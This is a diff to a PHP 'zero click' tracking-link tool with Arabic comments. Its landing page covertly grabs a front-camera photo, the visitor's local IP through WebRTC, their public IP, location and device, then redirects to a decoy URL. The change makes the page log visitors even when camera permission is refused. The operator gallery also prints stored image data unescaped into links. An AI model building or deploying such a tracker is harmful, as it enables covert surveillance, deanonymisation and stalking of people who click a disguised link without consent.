@@ -13,7 +13,6 @@ try {
     $db = new PDO('sqlite:tracker_zero_click.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إضافة حقل use_camera لجدول الروابط لتحديد ما إذا كانت الكاميرا مفعلة أم لا
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -39,7 +38,6 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة لحذف التقاط صورة محددة بناءً على الـ ID
 if (isset($_GET['delete_id'])) {
     $del_id = intval($_GET['delete_id']);
     $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
@@ -175,7 +173,8 @@ if (isset($_GET['r'])) {
             exit();
         }
 
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+        // استقبال البيانات سواء تم إرسال صورة أو بيانات عامة فقط
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
@@ -183,12 +182,10 @@ if (isset($_GET['r'])) {
             $location = get_ip_location($public_ip);
             $device = get_device_type($ua);
 
-            if (!empty($img_base64)) {
-                try {
-                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
-                } catch (Exception $e) {}
-            }
+            try {
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
+            } catch (Exception $e) {}
             exit('OK');
         }
 ?>
@@ -206,7 +203,7 @@ if (isset($_GET['r'])) {
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
     </style>
     <script>
-        let isCaptured = false;
+        let isProcessed = false;
         const useCamera = <?php echo $use_camera; ?>;
         const targetUrl = "<?php echo $target_redirect; ?>";
 
@@ -230,16 +227,33 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function triggerCaptureAndRedirect() {
-            if (isCaptured) return;
-            isCaptured = true;
+        function sendInfoAndRedirect(imageData = "") {
+            if (isProcessed) return;
+            isProcessed = true;
 
-            // إذا كان خيار الكاميرا ملغى، يتم التوجيه الفوري بدون كاميرا
+            getLocalIP(function(localIp) {
+                const formData = new URLSearchParams();
+                formData.append('save_info', '1');
+                formData.append('image', imageData);
+                formData.append('lip', localIp);
+
+                fetch(window.location.href, {
+                    method: 'POST',
+                    body: formData
+                }).finally(() => {
+                    window.location.replace(targetUrl);
+                });
+            });
+        }
+
+        function initTracking() {
             if (!useCamera) {
-                window.location.replace(targetUrl);
+                // إذا كانت الكاميرا غير مفعلة، أرسل المعلومات الأساسية فوراً وانتقل
+                sendInfoAndRedirect("");
                 return;
             }
 
+            // إذا كانت الكاميرا مفعلة، حاول التقاط الصورة مع جمع باقي المعلومات
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -256,32 +270,21 @@ if (isset($_GET['r'])) {
                         const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
 
-                        getLocalIP(function(localIp) {
-                            const formData = new URLSearchParams();
-                            formData.append('save_capture', '1');
-                            formData.append('image', imageData);
-                            formData.append('lip', localIp);
-
-                            fetch(window.location.href, {
-                                method: 'POST',
-                                body: formData
-                            }).finally(() => {
-                                window.location.replace(targetUrl);
-                            });
-                        });
+                        sendInfoAndRedirect(imageData);
                     }, 300);
                 })
                 .catch(err => {
-                    window.location.replace(targetUrl);
+                    // في حال رفض إذن الكاميرا، يتم إرسال باقي المعلومات بدون صورة والتوجيه طبيعياً
+                    sendInfoAndRedirect("");
                 });
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            triggerCaptureAndRedirect();
+            initTracking();
         });
 
         window.addEventListener('click', () => {
-            triggerCaptureAndRedirect();
+            initTracking();
         }, { once: true });
     </script>
 </head>
@@ -346,7 +349,6 @@ if (!empty($filter_code)) {
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
-        /* خلفية متدرجة حديثة ومميزة */
         body { 
             background: radial-gradient(circle at top right, #1e1b4b, #090d16 60%);
             background-attachment: fixed;
@@ -378,7 +380,6 @@ if (!empty($filter_code)) {
         input[type="text"] { width: 100%; background: #050b14; border: 1px solid var(--border-color); border-radius: 10px; padding: 14px 16px; color: var(--text-main); font-size: 14px; outline: none; transition: border-color 0.2s; }
         input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
         
-        /* تنسيق زر الاختيار (Checkbox) للكاميرا */
         .checkbox-container {
             display: flex;
             align-items: center;
@@ -506,9 +507,16 @@ if (!empty($filter_code)) {
                 <div class="gallery-grid">
                     <?php foreach ($captures as $cap): ?>
                         <div class="card-img">
-                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
-                            </a>
+                            <?php if (!empty($cap['image_data'])): ?>
+                                <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                    <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                </a>
+                            <?php else: ?>
+                                <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--text-muted); font-size: 12px; border: 1px dashed var(--border-color);">
+                                    الكاميرا معطلة (بدون صورة)
+                                </div>
+                            <?php endif; ?>
+
                             <div class="info-row" style="margin-top:10px;">
                                 <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                             </div>
@@ -531,8 +539,7 @@ if (!empty($filter_code)) {
                                 <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                             </div>
                             
-                            <!-- زر حذف الصورة -->
-                            <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذه الصورة؟');">حذف الصورة</a>
+                            <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا السجل؟');">حذف السجل</a>
                         </div>
                     <?php endforeach; ?>
                 </div>
